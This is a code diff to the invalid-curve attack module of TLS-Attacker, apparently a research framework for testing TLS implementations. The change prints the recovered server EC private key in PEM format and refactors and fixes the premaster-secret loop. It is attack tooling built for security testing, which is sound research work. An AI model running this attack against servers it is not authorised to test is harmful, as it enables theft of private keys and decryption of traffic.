@@ -13,6 +13,7 @@ import de.rub.nds.modifiablevariable.bytearray.ByteArrayModificationFactory;
 import de.rub.nds.modifiablevariable.bytearray.ModifiableByteArray;
 import de.rub.nds.modifiablevariable.util.ArrayConverter;
 import de.rub.nds.tlsattacker.attacks.config.InvalidCurveAttackConfig;
+import de.rub.nds.tlsattacker.attacks.ec.EcPemCreator;
 import de.rub.nds.tlsattacker.attacks.ec.ICEAttacker;
 import de.rub.nds.tlsattacker.attacks.ec.oracles.RealDirectMessageECOracle;
 import de.rub.nds.tlsattacker.core.config.Config;
@@ -36,6 +37,10 @@ import de.rub.nds.tlsattacker.core.workflow.action.SendAction;
 import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowConfigurationFactory;
 import de.rub.nds.tlsattacker.core.workflow.factory.WorkflowTraceType;
 import java.math.BigInteger;
+import java.security.NoSuchAlgorithmException;
+import java.security.NoSuchProviderException;
+import java.security.spec.InvalidKeySpecException;
+import java.security.spec.InvalidParameterSpecException;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 import org.bouncycastle.util.BigIntegers;
@@ -69,6 +74,16 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
                 tlsConfig.getDefaultSelectedNamedGroup());
         BigInteger result = attacker.attack();
         LOGGER.info("Result found: {}", result);
+
+        try {
+            String pem = EcPemCreator.createPemFromPrivateEcKey(tlsConfig.getDefaultSelectedNamedGroup().getJavaName(),
+                    result);
+            LOGGER.info("Resulting private key in PEM format:\n{}", pem);
+        } catch (NoSuchAlgorithmException | NoSuchProviderException | InvalidKeySpecException
+                | InvalidParameterSpecException e) {
+            LOGGER.info("Creating a PEM privte key object failed: ", e);
+        }
+
     }
 
     /**
@@ -85,22 +100,18 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
         EllipticCurve curve = CurveFactory.getCurve(config.getNamedGroup());
         Point point = Point.createPoint(config.getPublicPointBaseX(), config.getPublicPointBaseY(),
                 config.getNamedGroup());
-        for (int i = 0; i < getConfig().getProtocolFlows(); i++) {
-            if (config.getPremasterSecret() != null) {
-                premasterSecret = config.getPremasterSecret();
-            } else {
-                Point sharedPoint = curve.mult(new BigInteger("" + i + 1), point);
-                premasterSecret = sharedPoint.getX().getData();
-                if (premasterSecret == null) {
-                    premasterSecret = BigInteger.ZERO;
-                }
-                LOGGER.debug("PMS: " + premasterSecret.toString());
-            }
+
+        int protocolFlows = getConfig().getProtocolFlows();
+        if (config.getPremasterSecret() != null) {
+            protocolFlows = 1;
+        }
+
+        for (int i = 0; i < protocolFlows; i++) {
+            setPremasterSecret(curve, i, point);
             try {
                 WorkflowTrace trace = executeProtocolFlow();
                 if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.SERVER_HELLO, trace)) {
                     LOGGER.info("Did not receive ServerHello. Check your config");
-
                     return null;
                 }
                 if (!WorkflowTraceUtil.didReceiveMessage(HandshakeMessageType.FINISHED, trace)) {
@@ -114,6 +125,19 @@ public class InvalidCurveAttacker extends Attacker<InvalidCurveAttackConfig> {
             }
         }
         return false;
+    }
+
+    private void setPremasterSecret(EllipticCurve curve, int i, Point point) {
+        if (config.getPremasterSecret() != null) {
+            premasterSecret = config.getPremasterSecret();
+        } else {
+            Point sharedPoint = curve.mult(new BigInteger("" + (i + 1)), point);
+            premasterSecret = sharedPoint.getX().getData();
+            if (premasterSecret == null) {
+                premasterSecret = BigInteger.ZERO;
+            }
+            LOGGER.debug("PMS: " + premasterSecret.toString());
+        }
     }
 
     private WorkflowTrace executeProtocolFlow() {
